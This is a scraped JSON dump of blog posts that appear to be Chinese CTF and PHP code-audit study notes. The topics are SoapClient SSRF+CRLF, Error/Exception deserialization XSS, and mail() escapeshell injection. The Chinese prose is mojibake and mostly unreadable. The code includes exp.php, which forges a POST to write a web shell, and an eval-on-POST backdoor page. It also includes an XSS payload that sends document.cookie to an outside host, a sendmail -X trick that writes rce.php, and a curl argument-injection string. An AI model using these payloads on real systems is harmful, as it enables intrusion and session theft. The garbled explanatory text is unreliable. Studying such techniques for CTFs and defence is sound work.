charset&#x3D;utf-8SOAPAction: &quot;user#no_func&quot;Content-Length: 371&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;envelope&#x2F;&quot; xmlns:ns1&#x3D;&quot;user&quot; xmlns:xsd&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema&quot; xmlns:SOAP-ENC&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;encoding&#x2F;&quot; SOAP-ENV:encodingStyle&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;encoding&#x2F;&quot;&gt;&lt;SOAP-ENV:Body&gt;&lt;ns1:no_func&#x2F;&gt;&lt;&#x2F;SOAP-ENV:Body&gt;&lt;&#x2F;SOAP-ENV:Envelope&gt; çœ‹è¿™ä¸ªPOSTçš„è¯·æ±‚ï¼Œå‘ç°æœ‰ä¸¤ä¸ªåœ°æ–¹æ˜¯å¯æ§çš„ï¼ŒUser-Agentå’Œ SOAPActionï¼Œè€Œä¸”æ˜æ˜¾Content-Type å’Œ Content-Length éƒ½åœ¨User-Agent ä¹‹ä¸‹ï¼Œç”¨ wupco å¸ˆå‚…çš„payload å°±èƒ½è¿›è¡Œä»»æ„çš„ POSTè¯·æ±‚ï¼Œè¿™é‡Œè¦å…ˆ urldecode æ‰å¯ä»¥è¿›è¡Œååºåˆ—åŒ–ã€‚ exp.php 12345678910111213141516&lt;?php$target= &#x27;http://127.0.0.1/test.php&#x27;;$post_string= &#x27;1=file_put_contents(&quot;shell.php&quot;, &quot;&lt;?php phpinfo();?&gt;&quot;);&#x27;;$headers= array( &#x27;X-Forwarded-For:127.0.0.1&#x27;, &#x27;Cookie:admin=1&#x27; );$b= new SoapClient(null,array(&#x27;location&#x27;=&gt; $target,&#x27;user_agent&#x27;=&gt;&#x27;wupco^^Content-Type:application/x-www-form-urlencoded^^&#x27;.join(&#x27;^^&#x27;,$headers).&#x27;^^Content-Length:&#x27;.(string)strlen($post_string).&#x27;^^^^&#x27;.$post_string,&#x27;uri&#x27;=&gt;&quot;peri0d&quot;));$aaa= serialize($b);$aaa= str_replace(&#x27;^^&#x27;,&#x27;%0d%0a&#x27;,$aaa);$aaa= str_replace(&#x27;&amp;&#x27;,&#x27;%26&#x27;,$aaa);echo$aaa;$x= unserialize(urldecode($aaa));$x-&gt;no_func(); test.php 1234567&lt;?php if($_SERVER[&#x27;REMOTE_ADDR&#x27;]==&#x27;127.0.0.1&#x27;)&#123; echo &#x27;hi&#x27;; @$a=$_POST[1]; @eval($a);&#125;?&gt; è¿™æ ·å°±å¯ä»¥æˆåŠŸå†™å…¥shell.phpã€‚ Error/Exception + XSS é¢˜ç›®ï¼šBJDCTF 2rd XSSä¹‹å…‰ Gitæ³„éœ²ï¼Œç”¨GitHack dumpä¸‹æ¥ï¼š åªæœ‰ä¸€ä¸ªindex.phpæ–‡ä»¶ï¼š 123&lt;?php$a = $_GET[&#x27;yds_is_so_beautiful&#x27;];echo unserialize($a); ydsï¼Ÿï¼Ÿï¼Ÿæ¨å¤§æ ‘ï¼Ÿï¼Ÿï¼Ÿ Errorç±»å°±æ˜¯phpçš„ä¸€ä¸ªå†…ç½®ç±»ç”¨äºè‡ªåŠ¨è‡ªå®šä¹‰ä¸€ä¸ªErrorï¼Œåœ¨php7çš„ç¯å¢ƒä¸‹å¯èƒ½ä¼šé€ æˆä¸€ä¸ªxssæ¼æ´ï¼Œå› ä¸ºå®ƒå†…ç½®æœ‰ä¸€ä¸ªtoStringçš„æ–¹æ³•ã€‚ Exceptionç±»è·ŸErrorç±»åŸç†ä¸€æ ·ï¼Œä½†æ˜¯ä¹Ÿé€‚ç”¨äºPHP5 æˆ‘ä»¬å…ˆæ¥éªŒè¯ä¸€ä¸‹ï¼š POC 123&lt;?php$a = new Exception(&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;);echo urlencode(serialize($a)); å¾—åˆ°ç¼–ç åçš„ååºåˆ—åŒ–ç»“æœï¼š 1O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D æˆåŠŸè§¦å‘XSSã€‚ ä¹Ÿå¯ä»¥ç›´æ¥æ‰“cookieï¼š 123&lt;?php$s = &#x27;&lt;script&gt;var img=document.createElement(&quot;img&quot;);img.src=&quot;http://f7ffa642-8f7f-4879-bc49-e75d26e7c2bc.node3.buuoj.cn/a?&quot;+escape(document.cookie);&lt;/script&gt;&#x27;;echo serialize($s); SimpleXMLElement https://ca0y1h.top/code_audit/5.PHPä»£ç å®¡è®¡å­¦ä¹ â€”â€”Day3/#SimpleXMLElementXXEæ¼æ´","tags":[{"name":"webå®‰å…¨åŸºç¡€","slug":"webå®‰å…¨åŸºç¡€","permalink":"http://ca0y1h.top/tags/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"},{"name":"PHPååºåˆ—åŒ–","slug":"PHPååºåˆ—åŒ–","permalink":"http://ca0y1h.top/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}],"categories":[{"name":"webå®‰å…¨","slug":"webå®‰å…¨","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/"},{"name":"åŸºç¡€å­¦ä¹ ","slug":"webå®‰å…¨/åŸºç¡€å­¦ä¹ ","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"åˆ©ç”¨SoapClientç±»è¿›è¡ŒSSRF+CRLFæ”»å‡»","date":"2020-06-23T03:59:10.000Z","path":"Web_security/php_related/10.åˆ©ç”¨SoapClientç±»è¿›è¡ŒSSRF-CRLFæ”»å‡»/","text":"ã€è½¬ã€‘åˆ©ç”¨SoapClientç±»è¿›è¡ŒSSRF+CRLFæ”»å‡» åŸæ–‡é“¾æ¥ï¼šhttps://lethe.site/2019/09/06/åˆ©ç”¨SoapClientç±»è¿›è¡ŒSSRF-CRLFæ”»å‡»/# å¤ªæ‡’äº†ï¼Œå°±ä¸é‡å¤æ€»ç»“äº†ã€‚è½¬è½½letheå¸ˆå‚…çš„ä¸€ç¯‡æ–‡ç« ï¼Œä¾µæƒåˆ æ–‡ã€‚ 0x01 ä»€ä¹ˆæ˜¯Soap SOAPæ˜¯webServiceä¸‰è¦ç´ ï¼ˆSOAPã€WSDLã€UDDIï¼‰ä¹‹ä¸€ï¼š WSDL ç”¨æ¥æè¿°å¦‚ä½•è®¿é—®å…·ä½“çš„æ¥å£ã€‚ UDDIç”¨æ¥ç®¡ç†ï¼Œåˆ†å‘ï¼ŒæŸ¥è¯¢webServiceã€‚ SOAPï¼ˆç®€å•å¯¹è±¡è®¿é—®åè®®ï¼‰æ˜¯è¿æ¥æˆ–WebæœåŠ¡æˆ–å®¢æˆ·ç«¯å’ŒWebæœåŠ¡ä¹‹é—´çš„æ¥å£ã€‚ å…¶é‡‡ç”¨HTTPä½œä¸ºåº•å±‚é€šè®¯åè®®ï¼ŒXMLä½œä¸ºæ•°æ®ä¼ é€çš„æ ¼å¼ã€‚ 0x02 PHPä¸­çš„SoapClientç±» å‚è€ƒé“¾æ¥ï¼šhttps://www.php.net/manual/zh/soapclient.soapclient.php PHP çš„ SOAP æ‰©å±•å¯ä»¥ç”¨æ¥æä¾›å’Œä½¿ç”¨ Web Servicesï¼Œè¿™ä¸ªæ‰©å±•å®ç°äº†6ä¸ªç±»ï¼Œå…¶ä¸­çš„SoapClientç±»æ˜¯ç”¨æ¥åˆ›å»ºsoapæ•°æ®æŠ¥æ–‡ï¼Œä¸wsdlæ¥å£è¿›è¡Œäº¤äº’çš„ï¼ŒåŒæ—¶è¿™ä¸ªç±»ä¸‹ä¹Ÿæ˜¯æœ‰ååºåˆ—åŒ–ä¸­å¸¸å¸¸ç”¨åˆ°çš„__call()é­”æœ¯æ–¹æ³•ã€‚ è¯¥ç±»çš„æ„é€ å‡½æ•°å¦‚ä¸‹ï¼š 1public SoapClient :: SoapClient (mixed $wsdl [,array $options ]) ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç”¨æ¥æŒ‡æ˜æ˜¯å¦æ˜¯wsdlæ¨¡å¼ã€‚ ç¬¬äºŒä¸ªå‚æ•°ä¸ºä¸€ä¸ªæ•°ç»„ï¼Œå¦‚æœåœ¨wsdlæ¨¡å¼ä¸‹ï¼Œæ­¤å‚æ•°å¯é€‰ï¼›å¦‚æœåœ¨éwsdlæ¨¡å¼ä¸‹ï¼Œåˆ™å¿…é¡»è®¾ç½®locationå’Œurié€‰é¡¹ï¼Œå…¶ä¸­locationæ˜¯è¦å°†è¯·æ±‚å‘é€åˆ°çš„SOAPæœåŠ¡å™¨çš„URLï¼Œè€Œuri æ˜¯SOAPæœåŠ¡çš„ç›®æ ‡å‘½åç©ºé—´ã€‚ çŸ¥é“ä¸Šè¿°ä¸¤ä¸ªå‚æ•°çš„å«ä¹‰åï¼Œå°±å¾ˆå®¹æ˜“æ„é€ å‡ºSSRFçš„åˆ©ç”¨payloadäº†ã€‚ æˆ‘ä»¬å¯ä»¥è®¾ç½®ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºnullï¼Œç„¶åç¬¬äºŒä¸ªå‚æ•°çš„locationé€‰é¡¹è®¾ç½®ä¸ºtarget_urlï¼Œå¦‚ä¸‹ 12345&lt;?php$a = new SoapClient(null, array(&#x27;location&#x27; =&gt; &quot;http://xxx.xxx.xxx&quot;, &#x27;uri&#x27; =&gt; &quot;123&quot;));echo serialize($a);?&gt; å½“æŠŠä¸Šè¿°è„šæœ¬å¾—åˆ°çš„åºåˆ—åŒ–ä¸²è¿›è¡Œååºåˆ—åŒ–ï¼ˆunserializeï¼‰ï¼Œå¹¶æ‰§è¡Œä¸€ä¸ªSoapClientæ²¡æœ‰çš„æˆå‘˜å‡½æ•°æ—¶ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨è¯¥ç±»çš„__Callæ–¹æ³•ï¼Œç„¶åå‘target_urlå‘é€ä¸€ä¸ªsoapè¯·æ±‚ï¼Œå¹¶ä¸”urié€‰é¡¹æ˜¯æˆ‘ä»¬å¯æ§çš„åœ°æ–¹ã€‚ 0x03 CRLF Injection CRLFæ˜¯â€å›è½¦ + æ¢è¡Œâ€(\\r\\n)çš„ç®€ç§°ã€‚åœ¨HTTPåè®®ä¸­ï¼ŒHTTP Headerä¸HTTP Bodyæ˜¯ç”¨ä¸¤ä¸ªCRLFåˆ†éš”çš„ï¼Œæµè§ˆå™¨å°±æ˜¯æ ¹æ®è¿™ä¸¤ä¸ªCRLFæ¥å–å‡ºHTTP å†…å®¹å¹¶æ˜¾ç¤ºå‡ºæ¥ã€‚æ‰€ä»¥ï¼Œä¸€æ—¦æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶HTTP æ¶ˆæ¯å¤´ä¸­çš„å­—ç¬¦ï¼Œæ³¨å…¥ä¸€äº›æ¶æ„çš„æ¢è¡Œï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½æ³¨å…¥ä¸€äº›ä¼šè¯Cookieæˆ–è€…HTMLä»£ç ï¼Œæ‰€ä»¥CRLF Injectionåˆå«HTTP Response Splittingï¼Œç®€ç§°HRSã€‚ å‚è€ƒé“¾æ¥ï¼š [CRLF Injectionæ¼æ´çš„åˆ©ç”¨ä¸å®ä¾‹åˆ†æ](https://wooyun.js.org/drops/CRLF Injectionæ¼æ´çš„åˆ©ç”¨ä¸å®ä¾‹åˆ†æ.html) 0x04 SSRF+CRLFæ”»å‡»å†…ç½‘ å®é™…ä¸Šå¾ˆå¤šæ—¶å€™éƒ½éœ€è¦è¿™ä¸¤ä¸ªæ¼æ´é…åˆåœ¨ä¸€èµ·ä½¿ç”¨ï¼Œå½“æˆ‘ä»¬æˆ‘ä»¬å¯ä»¥ä»å¤–ç½‘è°ƒç”¨åˆ°soapçš„apiï¼Œè€Œæ”»å‡»ç›®æ ‡æ˜¯åœ¨å†…ç½‘ï¼Œé‚£ä¹ˆå°±å¯ä»¥åˆ©ç”¨SoapClientè¿›è¡ŒSSRFæ”»å‡»å†…ç½‘ï¼Œç„¶åé…åˆCRLFæ„é€ POSTè¯·æ±‚å¢åŠ æˆ‘ä»¬çš„æ”»å‡»é¢ã€‚ é‚£ä¹ˆä¸ºä»€ä¹ˆåœ¨ç”¨SoapClientç±»è¿›è¡ŒSSRFçš„æ—¶å€™ä¼šæœ‰CRLFæ³¨å…¥çš„é—®é¢˜å‘¢ï¼Ÿå¦‚ä¸‹ï¼š å¯ä»¥çœ‹åˆ°optionså‚æ•°ä¸­è¿˜æœ‰ä¸€ä¸ªé€‰é¡¹ä¸ºuser_agentï¼Œè¿è¡Œæˆ‘ä»¬è‡ªå·±è®¾ç½®User-Agentçš„å€¼ã€‚ å½“æˆ‘ä»¬å¯ä»¥æ§åˆ¶User-Agentçš„å€¼æ—¶ï¼Œä¹Ÿå°±æ„å‘³ç€æˆ‘ä»¬å®Œå…¨å¯ä»¥æ„é€ ä¸€ä¸ªPOSTè¯·æ±‚ï¼Œå› ä¸ºContent-Typeä¸ºå’ŒContent-Lengthéƒ½åœ¨User-Agentä¹‹ä¸‹ï¼Œè€Œæ§åˆ¶è¿™ä¸¤ä¸ªæ˜¯åˆ©ç”¨CRLFå‘é€postè¯·æ±‚æœ€å…³é”®çš„åœ°æ–¹ã€‚ æœ€åç»™å‡ºwupcoå¸ˆå‚…çš„ç”Ÿæˆä»»æ„POSTæŠ¥æ–‡çš„POC: 1234567891011121314&lt;?php$target = &#x27;http://123.206.216.198/bbb.php&#x27;;$post_string = &#x27;a=b&amp;flag=aaa&#x27;;$headers = array( &#x27;X-Forwarded-For: 127.0.0.1&#x27;, &#x27;Cookie: xxxx=1234&#x27; );$b = new SoapClient(null,array(&#x27;location&#x27; =&gt; $target,&#x27;user_agent&#x27;=&gt;&#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27;.join(&#x27;^^&#x27;,$headers).&#x27;^^Content-Length: &#x27;.(string)strlen($post_string).&#x27;^^^^&#x27;.$post_string,&#x27;uri&#x27; =&gt; &quot;aaab&quot;));$aaa = serialize($b);$aaa = str_replace(&#x27;^^&#x27;,&#x27;%0d%0a&#x27;,$aaa);$aaa = str_replace(&#x27;&amp;&#x27;,&#x27;%26&#x27;,$aaa);echo $aaa;?&gt; å¦‚æœæ˜¯GETè¯·æ±‚çš„è¯ï¼Œé‚£ä¹ˆæ„é€ å¥½locationå°±è¡Œï¼š 1234567&lt;?php$url = &quot;http://127.0.0.1/flag.php&quot;;$b = new SoapClient(null, array(&#x27;uri&#x27; =&gt; $url, &#x27;location&#x27; =&gt; $url));$a = serialize($b);$a = str_replace(&#x27;^^&#x27;, &quot;\\r\\n&quot;, $a);echo &quot;|&quot; . urlencode($a);?&gt;","tags":[{"name":"webå®‰å…¨åŸºç¡€","slug":"webå®‰å…¨åŸºç¡€","permalink":"http://ca0y1h.top/tags/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"},{"name":"SSRF","slug":"SSRF","permalink":"http://ca0y1h.top/tags/SSRF/"}],"categories":[{"name":"webå®‰å…¨","slug":"webå®‰å…¨","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/"},{"name":"åŸºç¡€å­¦ä¹ ","slug":"webå®‰å…¨/åŸºç¡€å­¦ä¹ ","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"PHPä»£ç å®¡è®¡å­¦ä¹ â€”â€”Day5","date":"2020-06-17T03:58:41.000Z","path":"code_audit/7.PHPä»£ç å®¡è®¡å­¦ä¹ â€”â€”Day5/","text":"PHPä»£ç å®¡è®¡å­¦ä¹ Day5â€”â€”escapeshellargä¸escapeshellcmdä½¿ç”¨ä¸å½“ 0x01 postcart 12345678910111213141516171819202122232425262728293031323334353637class Mailer &#123; private function sanitize($email) &#123; if (!filter_var($email, FILTER_VALIDATE_EMAIL)) &#123; return &#x27;&#x27;; &#125; return escapeshellarg($email); &#125; public function send($data) &#123; if (!isset($data[&#x27;to&#x27;])) &#123; $data[&#x27;to&#x27;] = &#x27;none@ripstech.com&#x27;; &#125; else &#123; $data[&#x27;to&#x27;] = $this-&gt;sanitize($data[&#x27;to&#x27;]); &#125; if (!isset($data[&#x27;from&#x27;])) &#123; $data[&#x27;from&#x27;] = &#x27;none@ripstech.com&#x27;; &#125; else &#123; $data[&#x27;from&#x27;] = $this-&gt;sanitize($data[&#x27;from&#x27;]); &#125; if (!isset($data[&#x27;subject&#x27;])) &#123; $data[&#x27;subject&#x27;] = &#x27;No Subject&#x27;; &#125; if (!isset($data[&#x27;message&#x27;])) &#123; $data[&#x27;message&#x27;] = &#x27;&#x27;; &#125; mail($data[&#x27;to&#x27;], $data[&#x27;subject&#x27;], $data[&#x27;message&#x27;], &#x27;&#x27;, &quot;-f&quot; . $data[&#x27;from&#x27;]); &#125;&#125;$mailer = new Mailer();$mailer-&gt;send($_POST); è¿™é“é¢˜å…¶å®æ˜¯è€ƒå¯Ÿç”± php å†…ç½®å‡½æ•° mail æ‰€å¼•å‘çš„å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚æˆ‘ä»¬å…ˆçœ‹çœ‹ php è‡ªå¸¦çš„ mail å‡½æ•°çš„ç”¨æ³•ï¼š mail ( string $to , string $subject , string $message [, mixed $additional_headers [, string $additional_parameters ]] ) : bool toï¼ŒæŒ‡å®šé‚®ä»¶æ¥æ”¶è€…ï¼Œå³æ¥æ”¶äºº subjectï¼Œé‚®ä»¶çš„æ ‡é¢˜ messageï¼Œé‚®ä»¶çš„æ­£æ–‡å†…å®¹ additional_headersï¼ŒæŒ‡å®šé‚®ä»¶å‘é€æ—¶å…¶ä»–çš„é¢å¤–å¤´éƒ¨ï¼Œå¦‚å‘é€è€…Fromï¼ŒæŠ„é€CCï¼Œéšè—æŠ„é€BCC additional_parametersï¼ŒæŒ‡å®šä¼ é€’ç»™å‘é€ç¨‹åºsendmailçš„é¢å¤–å‚æ•°ã€‚ åœ¨Linuxç³»ç»Ÿä¸Šï¼Œsendå‡½æ•°é»˜è®¤è°ƒç”¨ Linux çš„ sendmail ç¨‹åºå‘é€é‚®ä»¶ã€‚è€Œåœ¨é¢å¤–å‚æ•°( additional_parameters )ä¸­ï¼Œ sendmail ä¸»è¦æ”¯æŒçš„é€‰é¡¹æœ‰ä»¥ä¸‹ä¸‰ç§ï¼š -O option = value QueueDirectory = queuedir é€‰æ‹©é˜Ÿåˆ—æ¶ˆæ¯ -X logfile è¿™ä¸ªå‚æ•°å¯ä»¥æŒ‡å®šä¸€ä¸ªç›®å½•æ¥è®°å½•å‘é€é‚®ä»¶æ—¶çš„è¯¦ç»†æ—¥å¿—æƒ…å†µã€‚ -f from email è¿™ä¸ªå‚æ•°å¯ä»¥è®©æˆ‘ä»¬æŒ‡å®šæˆ‘ä»¬å‘é€é‚®ä»¶çš„é‚®ç®±åœ°å€ã€‚ æ¼æ´ä¸€ å†™ä¸€ä¸ªdemoï¼š 12345678&lt;?php$to = &quot;Alice@example/com&quot;;$from = &quot;Hello Alice&quot;;$message = &quot;&lt;?php phpinfo(); ?&gt;&quot;;$headers = &quot;CC: somebodyelse@example.com&quot;;$options = &quot;-OQueueDirectory=/tmp -X /var/www/html/rce.php&quot;;mail($to, $subject, $message, $header, $options);?&gt; ä¸Šé¢è¿™ä¸ªæ ·ä¾‹ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨ -X å‚æ•°æŒ‡å®šæ—¥å¿—æ–‡ä»¶ï¼Œæœ€ç»ˆä¼šåœ¨ /var/www/html/rce.php ä¸­å†™å…¥å¦‚ä¸‹æ•°æ®ï¼šè¿è¡Œä¹‹åä¼šç”Ÿæˆä¸€ä¸ªrce.phpçš„æ—¥å¿—æ–‡ä»¶ï¼ŒæŸ¥çœ‹å…¶å†…å®¹ï¼š æ¼æ´äºŒ ä½†æ˜¯æˆ‘ä»¬è¿˜å¯ä»¥åœ¨$toè¿™ä¸ªå­—æ®µæ³¨å…¥å‘½ä»¤ï¼Œå…³äºè¿™ä¸ªå­—æ®µä¸€å…±æœ‰ä¸‰å±‚è¿‡æ»¤ã€‚ ç¬¬ä¸€å±‚ï¼šfilter_var 1filter_var($email, FILTER_VALIDATE_EMAIL) Pç‰›çš„ä¸€ç¯‡æ–‡ç« ä¹Ÿæåˆ°äº†æ€ä¹ˆç»•è¿‡FILTER_VALIDATE_EMAILï¼šhttps://www.leavesongs.com/PENETRATION/some-tricks-of-attacking-lnmp-web-application.html è¿™é‡Œå°±ç”¨å‡ ä¸ªdemoæ¼”ç¤ºä¸€ä¸‹æ–¹ä¾¿ç†è§£ï¼š 12345678910111213141516171819&lt;?php$email1 = &#x27;12 3@test.com&#x27;;echo $email1;var_dump(filter_var($email1, FILTER_VALIDATE_EMAIL)).&quot;\\n&quot;;$email2 = &#x27;12\\ 3@test.com&#x27;;echo $email2;var_dump(filter_var($email2, FILTER_VALIDATE_EMAIL)).&quot;\\n&quot;;$email3 = &#x27;&quot;12\\ 3&quot;@test.com&#x27;;echo $email3;var_dump(filter_var($email3, FILTER_VALIDATE_EMAIL)).&quot;\\n&quot;;$email4 = &#x27;&quot;123\\&quot;\\&#x27;&quot;@test.com&#x27;;echo $email4;var_dump(filter_var($email4, FILTER_VALIDATE_EMAIL)).&quot;\\n&quot;;$email5 = &#x27;\\&#x27;.&quot;123&quot;@test.com&#x27;;echo $email5;var_dump(filter_var($email5, FILTER_VALIDATE_EMAIL)).&quot;\\n&quot;;$email6 = &#x27;\\&quot;.&quot;123&quot;@test.com&#x27;;echo $email6;var_dump(filter_var($email6, FILTER_VALIDATE_EMAIL)).&quot;\\n&quot;; æµ‹è¯•ç»“æœå¦‚ä¸‹ï¼š 12345612 3@test.combool(false)12\\ 3@test.combool(false)&quot;12\\ 3&quot;@test.comstring(16) &quot;&quot;12\\ 3&quot;@test.com&quot;&quot;123\\&quot;&#39;&quot;@test.comstring(17) &quot;&quot;123\\&quot;&#39;&quot;@test.com&quot;&#39;.&quot;123&quot;@test.comstring(16) &quot;&#39;.&quot;123&quot;@test.com&quot;\\&quot;.&quot;123&quot;@test.combool(false) ç¬¬äºŒå±‚ï¼šescapeshellarg å®˜æ–¹æ–‡æ¡£ï¼š escapeshellarg â€”â€” æŠŠå­—ç¬¦ä¸²è½¬ç ä¸ºå¯ä»¥åœ¨ shell å‘½ä»¤é‡Œä½¿ç”¨çš„å‚æ•° åŠŸèƒ½ ï¼šescapeshellarg() å°†ç»™å­—ç¬¦ä¸²å¢åŠ ä¸€ä¸ªå•å¼•å·å¹¶ä¸”èƒ½å¼•ç”¨æˆ–è€…è½¬ç ä»»ä½•å·²ç»å­˜åœ¨çš„å•å¼•å·ï¼Œè¿™æ ·ä»¥ç¡®ä¿èƒ½å¤Ÿç›´æ¥å°†ä¸€ä¸ªå­—ç¬¦ä¸²ä¼ å…¥ shell å‡½æ•°ï¼Œshell å‡½æ•°åŒ…å« exec()ï¼Œsystem() æ‰§è¡Œè¿ç®—ç¬¦(åå¼•å·) demo1ï¼š 1234567&lt;?php$a = &#x27;123&#x27;;$b=escapeshellarg($a);echo &quot;old: &quot;.$a.&quot;\\n&quot;;echo &quot;now: &quot;.$b;?&gt;//old: 123 now: &#x27;123&#x27; ä¸¤è¾¹åŠ ä¸Šå•å¼•å· demo2ï¼š 1234567&lt;?php$a = &quot;12&#x27;3&quot;;$b=escapeshellarg($a);echo &quot;old: &quot;.$a.&quot;\\t\\t&quot;;echo &quot;now: &quot;.$b;?&gt;//old: 12&#x27;3 now: &#x27;12&#x27;\\&#x27;&#x27;3&#x27; å•å¼•å·è¢«è½¬ä¹‰ï¼Œä¸¤è¾¹å‡åŠ ä¸Šå•å¼•å· ç¬¬ä¸‰å±‚ï¼šescapeshellcmd PHPçš„ mail() å‡½æ•°åœ¨åº•å±‚å®ç°ä¸­ï¼Œè°ƒç”¨äº† escapeshellcmd() å‡½æ•°ï¼Œå®˜æ–¹æ–‡æ¡£ï¼š escapeshellcmd() â€”â€” å¯¹å­—ç¬¦ä¸²ä¸­å¯èƒ½ä¼šæ¬ºéª— shell å‘½ä»¤æ‰§è¡Œä»»æ„å‘½ä»¤çš„å­—ç¬¦è¿›è¡Œè½¬ä¹‰ã€‚ æ­¤å‡½æ•°ä¿è¯ç”¨æˆ·è¾“å…¥çš„æ•°æ®åœ¨ä¼ é€åˆ° exec() æˆ– system() å‡½æ•°ï¼Œæˆ–è€… æ‰§è¡Œæ“ä½œç¬¦ ä¹‹å‰è¿›è¡Œè½¬ä¹‰ã€‚ åæ–œçº¿ï¼ˆ\\ï¼‰ä¼šåœ¨ä»¥ä¸‹å­—ç¬¦ä¹‹å‰æ’å…¥ï¼š *&amp;#;`|*?~&lt;&gt;^()[]{}$*, \\x0A å’Œ \\xFFã€‚ â€™ å’Œ &quot; ä»…åœ¨ä¸é…å¯¹å„¿çš„æ—¶å€™è¢«è½¬ä¹‰ã€‚ åœ¨ Windows å¹³å°ä¸Šï¼Œæ‰€æœ‰è¿™äº›å­—ç¬¦ä»¥åŠ % å’Œ ! å­—ç¬¦éƒ½ä¼šè¢«ç©ºæ ¼ä»£æ›¿ã€‚ demo1ï¼š 1234567&lt;?php$a = &#x27;12&quot;3&#x27;;$b=escapeshellcmd($a);echo &quot;old: &quot;.$a.&quot;\\t\\t&quot;;echo &quot;now: &quot;.$b;?&gt;// old: 12&quot;3 now: 12\\&quot;3 demo2ï¼š 1234567&lt;?php$a = &#x27;12&quot;3&quot;&#x27;;$b=escapeshellcmd($a);echo &quot;old: &quot;.$a.&quot;\\t\\t&quot;;echo &quot;now: &quot;.$b;?&gt;//old: 12&quot;3&quot; now: 12&quot;3&quot; æ³¨æ„ &#x27; å’Œ &quot; ä»…åœ¨ä¸é…å¯¹å„¿çš„æ—¶å€™è¢«è½¬ä¹‰ é‚£æˆ‘ä»¬å‰é¢è¯´è¿‡äº†PHPçš„ mail() å‡½æ•°åœ¨åº•å±‚è°ƒç”¨äº† escapeshellcmd() å‡½æ•°å¯¹ç”¨æˆ·è¾“å…¥çš„é‚®ç®±åœ°å€è¿›è¡Œå¤„ç†ï¼Œå³ä½¿æˆ‘ä»¬ä½¿ç”¨å¸¦æœ‰ç‰¹æ®Šå­—ç¬¦çš„payloadï¼Œç»•è¿‡ filter_var() çš„æ£€æµ‹ï¼Œä½†è¿˜æ˜¯ä¼šè¢« escapeshellcmd() å¤„ç†ã€‚ç„¶è€Œ escapeshellcmd() å’Œ escapeshellarg ä¸€èµ·ä½¿ç”¨ï¼Œä¼šé€ æˆç‰¹æ®Šå­—ç¬¦é€ƒé€¸ï¼Œä¸‹é¢é€šè¿‡ä¸€ä¸ªç®€å•ä¾‹å­ç†è§£ä¸€ä¸‹ï¼š 12345678910&lt;?php $param=&quot;127.0.0.1&#x27; -v -d a=1&quot;; $a=escapeshellarg($param); $b=escapeshellcmd($a); $cmd=&quot;curl &quot;.$b; var_dump($a).&#x27;\\n&#x27;; var_dump($b).&#x27;\\n&#x27;; var_dump($cmd).&#x27;\\n&#x27;; system($cmd);?&gt; è¯¦ç»†åˆ†æä¸€ä¸‹è¿™ä¸ªè¿‡ç¨‹ï¼š ä¼ å…¥çš„å‚æ•°æ˜¯ 1127.0.0.1&#39; -v -d a&#x3D;1 ç”±äºescapeshellargå…ˆå¯¹å•å¼•å·è½¬ä¹‰ï¼Œå†ç”¨å•å¼•å·å°†å·¦å³ä¸¤éƒ¨åˆ†æ‹¬èµ·æ¥ä»è€Œèµ·åˆ°è¿æ¥çš„ä½œç”¨ã€‚æ‰€ä»¥å¤„ç†ä¹‹åçš„æ•ˆæœå¦‚ä¸‹ï¼š 1&#39;127.0.0.1&#39;\\&#39;&#39; -v -d a&#x3D;1&#39; æ¥ç€ escapeshellcmd å‡½æ•°å¯¹ç¬¬äºŒæ­¥å¤„ç†åå­—ç¬¦ä¸²ä¸­çš„ \\ ä»¥åŠ a=1' ä¸­çš„å•å¼•å·è¿›è¡Œè½¬ä¹‰å¤„ç†ï¼Œç»“æœå¦‚ä¸‹æ‰€ç¤ºï¼š 1&#39;127.0.0.1&#39;\\\\&#39;&#39; -v -d a&#x3D;1\\&#39; ç”±äºç¬¬ä¸‰æ­¥å¤„ç†ä¹‹åçš„payloadä¸­çš„ \\\\ è¢«è§£é‡Šæˆäº† \\ è€Œä¸å†æ˜¯è½¬ä¹‰å­—ç¬¦ï¼Œæ‰€ä»¥å•å¼•å·é…å¯¹è¿æ¥ä¹‹åå°†payloadåˆ†å‰²ä¸ºä¸‰ä¸ªéƒ¨åˆ†ï¼Œå…·ä½“å¦‚ä¸‹æ‰€ç¤ºï¼š 0x02 å®ä¾‹åˆ†æ è¿™é‡Œå®ä¾‹åˆ†æé€‰æ‹© PHPMailer 